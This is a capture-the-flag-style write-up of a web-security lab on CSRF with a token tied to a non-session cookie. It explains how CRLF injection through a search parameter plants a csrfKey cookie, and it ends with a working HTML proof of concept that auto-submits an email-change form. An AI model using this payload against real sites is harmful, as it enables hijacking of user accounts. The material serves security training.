# CSRF where token is tied to non-session cookie

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

Credentials - wiener:peter, carlos:montoya

### Analysis/Exploitation -

Login as user `wiener`:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/48a33bf9-4b46-4623-b486-8713da08cf8b/2024-02-19_09-40.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UX3TYWQK%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215450Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCYhVC2xgJmNli2jEQgmqnveoiPYHmVmjCH9htbnktF8wIhAOpoIcFxghhrGbiNfIYPF9%2FVhwHtRxP%2BOXXJ%2BBcZT5AqKogECK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxbRp3x90%2FLCM2ovWwq3AM%2FllJb1GyU5dTdz8WjLqSwjPRTxHj13UAYQYKJA3y6bB%2BMB3M2rT0Y3EVW%2FJt%2BfmNYZ8UWI1G7uPYz7lRQLOnpJvZ5rLxPr%2FQytrfMYjcQRi9njqkQLc2b0Fjc8kmo3yAL5ulxtW7LelJCkk5fAzJSld7RHZXoPSjzuux7ACi9rz2gVX3c9kUHSpHPgQssOk%2BhVTplyHXmqQkMSIQglSAQ7HC5cRsOmZPJK61F8kMrMPD4g0i%2FXDqMRJJydDjgQm5Z7EaI5wU%2BKay47srgRMllTgcqi4WwmMR69r%2FL%2BQK6otECu8bF1IG4OSwXB2GiqjmXZe2g37UjsMN3IL7u1x7HJq%2Bi4flRaRzaS864whg5jAbEuVTFoeeMkMswBYlnZHNTN66Ah4VnHs4X3IqCZ42FawK9nbzDrZW4qT5nOaly7A7iEU4MpmI3Dr40SsbzkS4ANCFtyKrZuq2grtDWdBm4l9TbZfrRccUgF3C9xpHasr5HoEOP7BsKu4n9ofH5h3G2bdguyhOX6e4Smsfq22evbCNvGr5CFC2zbbSsLmCdr6Zq9%2BtslK%2B320mCk22PFud8fqBa0nJA81L4lz5tPO4ux5oHHrhLMm%2BF%2FpHttbITYF7gjM1Pwt3vDfzywjD0hKPUBjqkAfwH6y8L12dvQ890M0PS549AFS9Dr2%2BvEoV2WU%2BsJuVxhcj6DemHIvKjLbovtYQDSOsWMeqtQejiW151GqqNrf3cV75IWoMbvODTNI89vTJCcvcmgbO7g8c1clkPjb9Lce7b5oCPXOm%2FzXlthWgMPN5TPhhsKnjX9eDbbEJPkXZszAQFZpNcjkm%2BASHckPHDmfv8gMoSVKP%2BF%2BweENGm5j059maX&X-Amz-Signature=6949cb537de1ca5d26a67b0e927a7a43b2649c908595b6fa4b4bc11a6544cf7e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

The session cookie and the csrf-tokens are the expected parts. But there is a second cookie `csrfKey`, that looks very similar to a second session value.

All values remain static for the session. When I logout and login again as the same user, the session cookie changes (this is expected) but csrfKey and csrf-token remain the same.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/660e4e77-f387-4cc6-a69a-54867b104a3a/2024-02-19_09-47.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UX3TYWQK%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215450Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCYhVC2xgJmNli2jEQgmqnveoiPYHmVmjCH9htbnktF8wIhAOpoIcFxghhrGbiNfIYPF9%2FVhwHtRxP%2BOXXJ%2BBcZT5AqKogECK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxbRp3x90%2FLCM2ovWwq3AM%2FllJb1GyU5dTdz8WjLqSwjPRTxHj13UAYQYKJA3y6bB%2BMB3M2rT0Y3EVW%2FJt%2BfmNYZ8UWI1G7uPYz7lRQLOnpJvZ5rLxPr%2FQytrfMYjcQRi9njqkQLc2b0Fjc8kmo3yAL5ulxtW7LelJCkk5fAzJSld7RHZXoPSjzuux7ACi9rz2gVX3c9kUHSpHPgQssOk%2BhVTplyHXmqQkMSIQglSAQ7HC5cRsOmZPJK61F8kMrMPD4g0i%2FXDqMRJJydDjgQm5Z7EaI5wU%2BKay47srgRMllTgcqi4WwmMR69r%2FL%2BQK6otECu8bF1IG4OSwXB2GiqjmXZe2g37UjsMN3IL7u1x7HJq%2Bi4flRaRzaS864whg5jAbEuVTFoeeMkMswBYlnZHNTN66Ah4VnHs4X3IqCZ42FawK9nbzDrZW4qT5nOaly7A7iEU4MpmI3Dr40SsbzkS4ANCFtyKrZuq2grtDWdBm4l9TbZfrRccUgF3C9xpHasr5HoEOP7BsKu4n9ofH5h3G2bdguyhOX6e4Smsfq22evbCNvGr5CFC2zbbSsLmCdr6Zq9%2BtslK%2B320mCk22PFud8fqBa0nJA81L4lz5tPO4ux5oHHrhLMm%2BF%2FpHttbITYF7gjM1Pwt3vDfzywjD0hKPUBjqkAfwH6y8L12dvQ890M0PS549AFS9Dr2%2BvEoV2WU%2BsJuVxhcj6DemHIvKjLbovtYQDSOsWMeqtQejiW151GqqNrf3cV75IWoMbvODTNI89vTJCcvcmgbO7g8c1clkPjb9Lce7b5oCPXOm%2FzXlthWgMPN5TPhhsKnjX9eDbbEJPkXZszAQFZpNcjkm%2BASHckPHDmfv8gMoSVKP%2BF%2BweENGm5j059maX&X-Amz-Signature=a435dfe1112ca5d29ceedd9abdfc261c49665c253bf6198b808799978a927f55&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

This indicates that the system providing the CSRF protection does not integrate into the session system, but creates its own type of session that is not in sync. This might violate the **tightly connected** property mentioned earlier.

> 💡 **Testing CSRF Tokens and CSRF cookies:**

  1. Check if the CSRF token is tied to the CSRF cookie
    - Submit an invalid CSRF token
    - Submit a valid CSRF token from another user

—>we get error and it concludes CSRF token may be tied to session or csrfKey cookie

  1. Submit both valid CSRF token and cookie from another user
—>we get 302 response and it concludes CSRF token is tied to csrfKey cookie

**In order to exploit this vulnerability, we need to perform 2 things:**

  1. Inject a csrfKey cookie in the user's session (HTTP Header injection) - satisfied
  1. Send a CSRF attack to the victim with a known csrf token
Login as user `carlos` in incognito:

Submit the "Update email" form, and intercept the resulting request.

**use  the session ID from the current **`carlos`**session, but both **`csrfKey`** as well ass **`csrf`**-token from user **`wiener`

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/c193d7c0-226f-4233-af37-70b28ae92d9c/2024-02-19_09-54.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UX3TYWQK%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215450Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCYhVC2xgJmNli2jEQgmqnveoiPYHmVmjCH9htbnktF8wIhAOpoIcFxghhrGbiNfIYPF9%2FVhwHtRxP%2BOXXJ%2BBcZT5AqKogECK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxbRp3x90%2FLCM2ovWwq3AM%2FllJb1GyU5dTdz8WjLqSwjPRTxHj13UAYQYKJA3y6bB%2BMB3M2rT0Y3EVW%2FJt%2BfmNYZ8UWI1G7uPYz7lRQLOnpJvZ5rLxPr%2FQytrfMYjcQRi9njqkQLc2b0Fjc8kmo3yAL5ulxtW7LelJCkk5fAzJSld7RHZXoPSjzuux7ACi9rz2gVX3c9kUHSpHPgQssOk%2BhVTplyHXmqQkMSIQglSAQ7HC5cRsOmZPJK61F8kMrMPD4g0i%2FXDqMRJJydDjgQm5Z7EaI5wU%2BKay47srgRMllTgcqi4WwmMR69r%2FL%2BQK6otECu8bF1IG4OSwXB2GiqjmXZe2g37UjsMN3IL7u1x7HJq%2Bi4flRaRzaS864whg5jAbEuVTFoeeMkMswBYlnZHNTN66Ah4VnHs4X3IqCZ42FawK9nbzDrZW4qT5nOaly7A7iEU4MpmI3Dr40SsbzkS4ANCFtyKrZuq2grtDWdBm4l9TbZfrRccUgF3C9xpHasr5HoEOP7BsKu4n9ofH5h3G2bdguyhOX6e4Smsfq22evbCNvGr5CFC2zbbSsLmCdr6Zq9%2BtslK%2B320mCk22PFud8fqBa0nJA81L4lz5tPO4ux5oHHrhLMm%2BF%2FpHttbITYF7gjM1Pwt3vDfzywjD0hKPUBjqkAfwH6y8L12dvQ890M0PS549AFS9Dr2%2BvEoV2WU%2BsJuVxhcj6DemHIvKjLbovtYQDSOsWMeqtQejiW151GqqNrf3cV75IWoMbvODTNI89vTJCcvcmgbO7g8c1clkPjb9Lce7b5oCPXOm%2FzXlthWgMPN5TPhhsKnjX9eDbbEJPkXZszAQFZpNcjkm%2BASHckPHDmfv8gMoSVKP%2BF%2BweENGm5j059maX&X-Amz-Signature=0490579ebd3bde436df3b5de4e030fb86980391cac09ce3c1964a63751b3d990&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

the request goes through and carlos email get changed:

I can change a victims email with my own CSRF-data. Including the csrf-token in the malicious HTML form is easy, but the `csrfKey` is taken from the cookie as **the **`csrfKey`** is a cookie**! And we couldn’t simply add our own cookie value. So the next step is to find a way to manipulate the cookie values.

**When we click the **`Search`** button, it’ll send a GET request to **`/`** with the parameter **`search`**.**

**Also, when we sent the request, it’ll set a new cookie value: **`LastSearchTerm=<seach_parameter_value>`**!**

So with it we can set any cookie value as we wanted.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/9e4f597b-c136-4cde-8a1f-e406f9b8c932/2024-02-19_10-00.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UX3TYWQK%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215450Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCYhVC2xgJmNli2jEQgmqnveoiPYHmVmjCH9htbnktF8wIhAOpoIcFxghhrGbiNfIYPF9%2FVhwHtRxP%2BOXXJ%2BBcZT5AqKogECK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxbRp3x90%2FLCM2ovWwq3AM%2FllJb1GyU5dTdz8WjLqSwjPRTxHj13UAYQYKJA3y6bB%2BMB3M2rT0Y3EVW%2FJt%2BfmNYZ8UWI1G7uPYz7lRQLOnpJvZ5rLxPr%2FQytrfMYjcQRi9njqkQLc2b0Fjc8kmo3yAL5ulxtW7LelJCkk5fAzJSld7RHZXoPSjzuux7ACi9rz2gVX3c9kUHSpHPgQssOk%2BhVTplyHXmqQkMSIQglSAQ7HC5cRsOmZPJK61F8kMrMPD4g0i%2FXDqMRJJydDjgQm5Z7EaI5wU%2BKay47srgRMllTgcqi4WwmMR69r%2FL%2BQK6otECu8bF1IG4OSwXB2GiqjmXZe2g37UjsMN3IL7u1x7HJq%2Bi4flRaRzaS864whg5jAbEuVTFoeeMkMswBYlnZHNTN66Ah4VnHs4X3IqCZ42FawK9nbzDrZW4qT5nOaly7A7iEU4MpmI3Dr40SsbzkS4ANCFtyKrZuq2grtDWdBm4l9TbZfrRccUgF3C9xpHasr5HoEOP7BsKu4n9ofH5h3G2bdguyhOX6e4Smsfq22evbCNvGr5CFC2zbbSsLmCdr6Zq9%2BtslK%2B320mCk22PFud8fqBa0nJA81L4lz5tPO4ux5oHHrhLMm%2BF%2FpHttbITYF7gjM1Pwt3vDfzywjD0hKPUBjqkAfwH6y8L12dvQ890M0PS549AFS9Dr2%2BvEoV2WU%2BsJuVxhcj6DemHIvKjLbovtYQDSOsWMeqtQejiW151GqqNrf3cV75IWoMbvODTNI89vTJCcvcmgbO7g8c1clkPjb9Lce7b5oCPXOm%2FzXlthWgMPN5TPhhsKnjX9eDbbEJPkXZszAQFZpNcjkm%2BASHckPHDmfv8gMoSVKP%2BF%2BweENGm5j059maX&X-Amz-Signature=bbd1d93592373de184e4302deb28709986d3110112202bbda106bead749f1c4d&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**In **[**Mozilla web docs**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)**, it said:**

> To send multiple cookies, multiple Set-Cookie headers should be sent in the same response.

**After I google this a little bit, I found this **[**Medium blog**](https://medium.com/@protostar0/crlf-injection-allow-cookie-injection-in-root-domain-xss-812cd807ba5b)**: which says CRLF injection allow cookie injection?**

**And after googled about CRLF injection, I found this post on **[**GeeksforGeeks**](https://www.geeksforgeeks.org/crlf-injection-attack/)

- `\r`** (Carriage Return)** → moves the cursor to the beginning of the line without advancing to the next line
- `\n`** (Line Feed)** → moves the cursor down to the next line without returning to the beginning of the line

**So if the web application is vulnerable, we can inject **`%0d%0a`** (**`\r\n`**) in the request**

Note: The `%3b%20` means `; `, and we need `SameSite` is set to `None`.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/85df3058-0706-4239-9d26-27f80ae15a72/2024-02-19_10-05.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UX3TYWQK%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215450Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCYhVC2xgJmNli2jEQgmqnveoiPYHmVmjCH9htbnktF8wIhAOpoIcFxghhrGbiNfIYPF9%2FVhwHtRxP%2BOXXJ%2BBcZT5AqKogECK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxbRp3x90%2FLCM2ovWwq3AM%2FllJb1GyU5dTdz8WjLqSwjPRTxHj13UAYQYKJA3y6bB%2BMB3M2rT0Y3EVW%2FJt%2BfmNYZ8UWI1G7uPYz7lRQLOnpJvZ5rLxPr%2FQytrfMYjcQRi9njqkQLc2b0Fjc8kmo3yAL5ulxtW7LelJCkk5fAzJSld7RHZXoPSjzuux7ACi9rz2gVX3c9kUHSpHPgQssOk%2BhVTplyHXmqQkMSIQglSAQ7HC5cRsOmZPJK61F8kMrMPD4g0i%2FXDqMRJJydDjgQm5Z7EaI5wU%2BKay47srgRMllTgcqi4WwmMR69r%2FL%2BQK6otECu8bF1IG4OSwXB2GiqjmXZe2g37UjsMN3IL7u1x7HJq%2Bi4flRaRzaS864whg5jAbEuVTFoeeMkMswBYlnZHNTN66Ah4VnHs4X3IqCZ42FawK9nbzDrZW4qT5nOaly7A7iEU4MpmI3Dr40SsbzkS4ANCFtyKrZuq2grtDWdBm4l9TbZfrRccUgF3C9xpHasr5HoEOP7BsKu4n9ofH5h3G2bdguyhOX6e4Smsfq22evbCNvGr5CFC2zbbSsLmCdr6Zq9%2BtslK%2B320mCk22PFud8fqBa0nJA81L4lz5tPO4ux5oHHrhLMm%2BF%2FpHttbITYF7gjM1Pwt3vDfzywjD0hKPUBjqkAfwH6y8L12dvQ890M0PS549AFS9Dr2%2BvEoV2WU%2BsJuVxhcj6DemHIvKjLbovtYQDSOsWMeqtQejiW151GqqNrf3cV75IWoMbvODTNI89vTJCcvcmgbO7g8c1clkPjb9Lce7b5oCPXOm%2FzXlthWgMPN5TPhhsKnjX9eDbbEJPkXZszAQFZpNcjkm%2BASHckPHDmfv8gMoSVKP%2BF%2BweENGm5j059maX&X-Amz-Signature=e7d581e56402c96beb23ac669106ffc2e9387d854a6ce2a09d44c5fa55dfd0ff&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

generate csrf poc

Remove the auto-submit `<script>` block, and instead add the following code to inject the cookie:

```text
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.form
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/39a7df58-e6fb-4bcf-9624-13ebea3239b0/2024-02-20_15-21.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UX3TYWQK%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T215450Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCYhVC2xgJmNli2jEQgmqnveoiPYHmVmjCH9htbnktF8wIhAOpoIcFxghhrGbiNfIYPF9%2FVhwHtRxP%2BOXXJ%2BBcZT5AqKogECK7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgxbRp3x90%2FLCM2ovWwq3AM%2FllJb1GyU5dTdz8WjLqSwjPRTxHj13UAYQYKJA3y6bB%2BMB3M2rT0Y3EVW%2FJt%2BfmNYZ8UWI1G7uPYz7lRQLOnpJvZ5rLxPr%2FQytrfMYjcQRi9njqkQLc2b0Fjc8kmo3yAL5ulxtW7LelJCkk5fAzJSld7RHZXoPSjzuux7ACi9rz2gVX3c9kUHSpHPgQssOk%2BhVTplyHXmqQkMSIQglSAQ7HC5cRsOmZPJK61F8kMrMPD4g0i%2FXDqMRJJydDjgQm5Z7EaI5wU%2BKay47srgRMllTgcqi4WwmMR69r%2FL%2BQK6otECu8bF1IG4OSwXB2GiqjmXZe2g37UjsMN3IL7u1x7HJq%2Bi4flRaRzaS864whg5jAbEuVTFoeeMkMswBYlnZHNTN66Ah4VnHs4X3IqCZ42FawK9nbzDrZW4qT5nOaly7A7iEU4MpmI3Dr40SsbzkS4ANCFtyKrZuq2grtDWdBm4l9TbZfrRccUgF3C9xpHasr5HoEOP7BsKu4n9ofH5h3G2bdguyhOX6e4Smsfq22evbCNvGr5CFC2zbbSsLmCdr6Zq9%2BtslK%2B320mCk22PFud8fqBa0nJA81L4lz5tPO4ux5oHHrhLMm%2BF%2FpHttbITYF7gjM1Pwt3vDfzywjD0hKPUBjqkAfwH6y8L12dvQ890M0PS549AFS9Dr2%2BvEoV2WU%2BsJuVxhcj6DemHIvKjLbovtYQDSOsWMeqtQejiW151GqqNrf3cV75IWoMbvODTNI89vTJCcvcmgbO7g8c1clkPjb9Lce7b5oCPXOm%2FzXlthWgMPN5TPhhsKnjX9eDbbEJPkXZszAQFZpNcjkm%2BASHckPHDmfv8gMoSVKP%2BF%2BweENGm5j059maX&X-Amz-Signature=d7f7017d91cc12729bdc91eabe57d5d435bd15eac3c159ceff44528d7ae95ebf&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1800d3045ae7ed82e29854004c006f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;domain&#46;com" />
      <input type="hidden" name="csrf" value="GDejMnJlFfCIXtNUq4fiUPAZwU3ew3dQ" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a1800d3045ae7ed82e29854004c006f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=EI5tQ8UWhMoPUcfJk0ulcN7mRnPhkcaC%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
